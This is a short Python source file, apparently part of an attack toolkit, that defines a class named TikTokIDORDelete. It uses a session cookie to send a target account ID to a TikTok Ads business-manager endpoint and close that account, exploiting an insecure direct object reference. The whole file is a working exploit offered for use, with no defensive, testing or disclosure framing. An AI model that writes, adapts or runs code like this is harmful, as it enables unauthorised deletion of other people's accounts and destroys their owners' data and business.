import requests
from modules.utils import logger

class TikTokIDORDelete:
    def __init__(self, session_cookie, org_id):
        self.session = requests.Session()
        if session_cookie:
            self.session.cookies.set('sessionid', session_cookie)
        self.org_id = org_id

    def exploit(self, target_account_id):
        if not self.session.cookies.get('sessionid'):
            return {'success': False, 'output': 'TikTok session cookie not set. Skipping IDOR deletion.'}
        if not target_account_id:
            return {'success': False, 'output': 'No target account ID provided.'}
        url = f"https://ads.tiktok.com/api/v2/bm/account/close/?org_id={self.org_id}"
        payload = {"account_id": target_account_id, "org_id": self.org_id}
        try:
            resp = self.session.post(url, json=payload, timeout=30)
            if resp.status_code == 200 and resp.json().get('code') == 0:
                return {'success': True, 'output': f'Account {target_account_id} deleted successfully'}
            else:
                return {'success': False, 'output': f'API error: {resp.status_code} – {resp.text[:200]}'}
        except Exception as e:
            return {'success': False, 'output': f'Error: {str(e)}'}
